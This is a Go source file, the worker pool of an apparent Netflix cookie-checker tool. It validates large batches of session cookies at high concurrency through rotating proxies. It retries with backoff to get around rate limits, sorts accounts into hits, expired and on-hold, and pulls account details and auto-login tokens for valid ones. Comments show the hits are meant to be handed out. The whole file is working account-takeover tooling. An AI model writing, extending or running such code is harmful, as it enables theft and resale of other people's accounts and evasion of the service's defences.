// Package worker implements the high-throughput, resource-aware goroutine pool.
package worker

import (
	"context"
	"crypto/sha256"
	"fmt"
	"math/rand"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/nfchecker/internal/checker"
	"github.com/nfchecker/internal/models"
	"github.com/nfchecker/internal/proxy"
	"golang.org/x/time/rate"
)

// Config controls the pool behavior.
type Config struct {
	Concurrency   int         // Number of concurrent worker goroutines (default 100)
	RatePerMinute int         // Max checks/min (0 or negative = unlimited)
	RetryOnProxy  bool        // Retry with new proxy on network errors
	MaxRetries    int         // Max retries per cookie (default 2)
	ProxyPool     *proxy.Pool // nil = direct
	ResultBuffer  int         // Channel buffer size (default 10000)
	MaxMemoryMB   uint64      // Maximum heap alloc before applying backpressure (default 450MB)
}

func (c *Config) defaults() {
	if c.Concurrency <= 0 {
		c.Concurrency = 100
	}
	if c.MaxRetries <= 0 {
		// One retry is not enough against a rate-limiting edge: 429s used to
		// be reported as dead cookies after two quick attempts.
		c.MaxRetries = 3
	}
	if c.ResultBuffer <= 0 {
		c.ResultBuffer = 10000
	}
	if c.MaxMemoryMB == 0 {
		c.MaxMemoryMB = 450
	}
}

// Pool is the main high-performance worker engine.
type Pool struct {
	cfg        Config
	limiter    *rate.Limiter
	seen       sync.Map // fingerprint dedup
	total      int64    // atomic
	done       int64    // atomic
	checksSec  [60]int64
	secBuckets [60]int64
}

// NewPool creates a worker pool with the given config.
func NewPool(cfg Config) *Pool {
	cfg.defaults()
	var lim *rate.Limiter
	if cfg.RatePerMinute > 0 {
		r := rate.Limit(float64(cfg.RatePerMinute) / 60.0)
		burst := cfg.Concurrency
		if burst < 1 {
			burst = 1
		}
		lim = rate.NewLimiter(r, burst)
	}
	return &Pool{
		cfg:     cfg,
		limiter: lim,
	}
}

// Run processes all cookies in `cookies`, writing results to the returned channel.
// The channel is closed when all cookies are processed or ctx is cancelled.
// job status is updated in real-time with lock-free atomic counters.
func (p *Pool) Run(ctx context.Context, cookies []*models.CookieSet, job *models.JobStatus) <-chan *models.CheckResult {
	totalCount := len(cookies)
	atomic.StoreInt64(&p.total, int64(totalCount))

	results := make(chan *models.CheckResult, p.cfg.ResultBuffer)

	// Bounded task channel prevents massive memory allocation on 1M+ batches
	taskBuf := p.cfg.Concurrency * 4
	if taskBuf > 10000 {
		taskBuf = 10000
	}
	if taskBuf > totalCount {
		taskBuf = totalCount
	}
	tasks := make(chan *models.CookieSet, taskBuf)

	// Producer goroutine: streams cookies into tasks channel with backpressure
	go func() {
		defer close(tasks)
		maxMemBytes := p.cfg.MaxMemoryMB * 1024 * 1024
		var ms runtime.MemStats

		for i, c := range cookies {
			// Periodic backpressure check every 256 cookies
			if i&0xFF == 0 {
				runtime.ReadMemStats(&ms)
				for ms.HeapAlloc > maxMemBytes {
					runtime.GC()
					select {
					case <-ctx.Done():
						return
					case <-time.After(50 * time.Millisecond):
					}
					runtime.ReadMemStats(&ms)
				}
			}

			select {
			case <-ctx.Done():
				return
			case tasks <- c:
			}
		}
	}()

	// Lock-free sliding-window RPM calculator
	stopRPM := make(chan struct{})
	go p.runRPMReporter(job, stopRPM)

	var wg sync.WaitGroup
	wg.Add(p.cfg.Concurrency)

	for i := 0; i < p.cfg.Concurrency; i++ {
		go func() {
			defer wg.Done()
			for cs := range tasks {
				select {
				case <-ctx.Done():
					return
				default:
				}

				// Deduplication by fingerprint
				if cs.Fingerprint == "" {
					h := sha256.Sum256([]byte(cs.NetflixId))
					cs.Fingerprint = fmt.Sprintf("%x", h)
				}
				if _, dup := p.seen.LoadOrStore(cs.Fingerprint, true); dup {
					job.IncrDuplicates()
					job.IncrChecked()
					res := models.AcquireCheckResult()
					res.Status = "duplicate"
					res.Cookie = cs
					res.CheckedAt = time.Now()
					results <- res
					continue
				}

				// Rate limiting (only if RatePerMinute > 0)
				if p.limiter != nil {
					if err := p.limiter.Wait(ctx); err != nil {
						return
					}
				}

				result := p.checkWithRetry(ctx, cs)

				// Record check for lock-free RPM calculation
				p.recordCheck()
				job.IncrChecked()
				if result.DurationMs > 0 {
					job.RecordCheckDuration(result.DurationMs)
				}

				switch result.Status {
				case "hit":
					job.IncrHits()
				case "expired":
					job.IncrExpired()
				case "hold":
					job.IncrHold()
				case "error":
					job.IncrErrors()
				}

				results <- result
			}
		}()
	}

	go func() {
		wg.Wait()
		close(stopRPM)
		close(results)
		if ctx.Err() != nil {
			job.SetCancelled()
		} else {
			job.SetDone()
		}
	}()

	return results
}

// recordCheck updates the rolling 60-second window in O(1) lock-free time.
func (p *Pool) recordCheck() {
	nowUnix := time.Now().Unix()
	idx := nowUnix % 60

	// Check if this slot belongs to the current second or an old second
	storedSec := atomic.LoadInt64(&p.secBuckets[idx])
	if storedSec != nowUnix {
		if atomic.CompareAndSwapInt64(&p.secBuckets[idx], storedSec, nowUnix) {
			atomic.StoreInt64(&p.checksSec[idx], 1)
			return
		}
	}
	atomic.AddInt64(&p.checksSec[idx], 1)
}

// runRPMReporter calculates the rolling checks-per-minute rate every second.
func (p *Pool) runRPMReporter(job *models.JobStatus, stop <-chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stop:
			return
		case now := <-ticker.C:
			currentSec := now.Unix()
			cutoff := currentSec - 60
			var sum int64

			for i := 0; i < 60; i++ {
				sec := atomic.LoadInt64(&p.secBuckets[i])
				if sec > cutoff && sec <= currentSec {
					sum += atomic.LoadInt64(&p.checksSec[i])
				}
			}

			job.SetRPM(float64(sum))
		}
	}
}

func (p *Pool) checkWithRetry(ctx context.Context, cs *models.CookieSet) *models.CheckResult {
	var lastErr error
	var lastResult *models.CheckResult

	for attempt := 0; attempt <= p.cfg.MaxRetries; attempt++ {
		if ctx.Err() != nil {
			res := models.AcquireCheckResult()
			res.Status = "error"
			res.Cookie = cs
			res.Error = "context cancelled"
			res.CheckedAt = time.Now()
			return res
		}

		var px *proxy.Proxy
		if p.cfg.ProxyPool != nil {
			px = p.cfg.ProxyPool.Next()
		}

		start := time.Now()
		result := processCookie(ctx, cs, px)
		result.DurationMs = time.Since(start).Milliseconds()

		if px != nil {
			if result.Status == "error" {
				p.cfg.ProxyPool.ReportFail(px)
			} else {
				p.cfg.ProxyPool.ReportSuccess(px)
			}
		}

		if result.Status != "error" {
			return result
		}

		lastErr = fmt.Errorf("%s", result.Error)
		lastResult = result

		// Retry transient failures even on the direct path: without a proxy
		// pool a single Netflix hiccup used to be reported as a hard error.
		if !p.cfg.RetryOnProxy {
			break
		}

		// The edge's own Retry-After wins; otherwise exponential backoff with
		// jitter, so 50 workers never retry in lockstep against one address.
		backoff := time.Duration(400*(1<<attempt)) * time.Millisecond
		if result.RetryAfterMs > 0 {
			backoff = time.Duration(result.RetryAfterMs) * time.Millisecond
		}
		if backoff > 10*time.Second {
			backoff = 10 * time.Second
		}
		backoff += time.Duration(rand.Int63n(300)) * time.Millisecond
		select {
		case <-time.After(backoff):
		case <-ctx.Done():
			return lastResult
		}
	}

	if lastResult != nil {
		return lastResult
	}
	res := models.AcquireCheckResult()
	res.Status = "error"
	res.Cookie = cs
	if lastErr != nil {
		res.Error = lastErr.Error()
	}
	res.CheckedAt = time.Now()
	return res
}

func processCookie(ctx context.Context, cs *models.CookieSet, px *proxy.Proxy) *models.CheckResult {
	res := models.AcquireCheckResult()
	res.Cookie = cs
	res.CheckedAt = time.Now()

	// Step 1: Validate session against Netflix
	vr := checker.ValidateSession(ctx, cs, px)
	if vr.Err != nil {
		res.Status = "error"
		res.Error = vr.Err.Error()
		res.RetryAfterMs = vr.RetryAfter.Milliseconds()
		if px != nil {
			res.ProxyUsed = px.Raw
		}
		return res
	}
	if !vr.Valid {
		res.Status = "expired"
		if px != nil {
			res.ProxyUsed = px.Raw
		}
		return res
	}

	// Step 2: Extract rich account info
	acct := checker.ExtractAccountInfo(vr.PageBody, cs)

	// A cookie can still open the membership page for a closed account, and
	// those accounts have no plan and no billing. Counting them as hits is
	// what made former / never-subscribed logins look like valid accounts.
	switch strings.ToUpper(strings.TrimSpace(acct.MembershipStatus)) {
	case "FORMER_MEMBER", "NEVER_MEMBER":
		res.Status = "expired"
		if px != nil {
			res.ProxyUsed = px.Raw
		}
		return res
	}

	// A paused subscription still renders its plan, so a held account used
	// to look exactly like a live Premium one. Netflix can bill it again,
	// but until then nothing plays on it, so it must not be handed out as a
	// hit.
	if acct.IsOnHold {
		res.Status = "hold"
		res.Account = acct
		if px != nil {
			res.ProxyUsed = px.Raw
		}
		return res
	}

	// Step 3: Fetch nftoken auto-login link
	nft, err := checker.FetchNfToken(ctx, cs, px)
	if err != nil {
		// Valid cookie even if iOS token exchange failed
		res.Status = "hit"
		res.Account = acct
		res.Error = "nftoken_failed: " + err.Error()
	} else {
		res.Status = "hit"
		res.Account = acct
		res.NfToken = nft
	}
	if px != nil {
		res.ProxyUsed = px.Raw
	}
	return res
}
